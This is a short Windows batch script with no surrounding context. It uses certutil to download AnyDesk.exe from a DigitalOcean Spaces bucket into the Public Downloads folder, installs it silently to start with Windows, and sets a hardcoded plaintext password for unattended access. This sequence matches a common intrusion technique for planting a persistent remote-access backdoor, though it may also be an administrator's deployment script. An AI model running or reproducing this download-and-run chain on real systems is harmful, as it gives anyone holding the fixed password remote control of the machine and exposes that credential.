certutil -urlcache -split -f "https://autofile.sfo2.digitaloceanspaces.com/AnyDesk.exe" "C:\Users\Public\Downloads\AnyDesk.exe"
cd /d C:\Users\Public\Downloads\
start /wait anydesk.exe --install  "C:\Program Files (x86)\AnyDesk" --start-with-win --silent --create-shortcuts --create-desktop-icon
cd /d C:\Program Files (x86)\AnyDesk
echo Lsm@2023@ | anydesk.exe --set-password
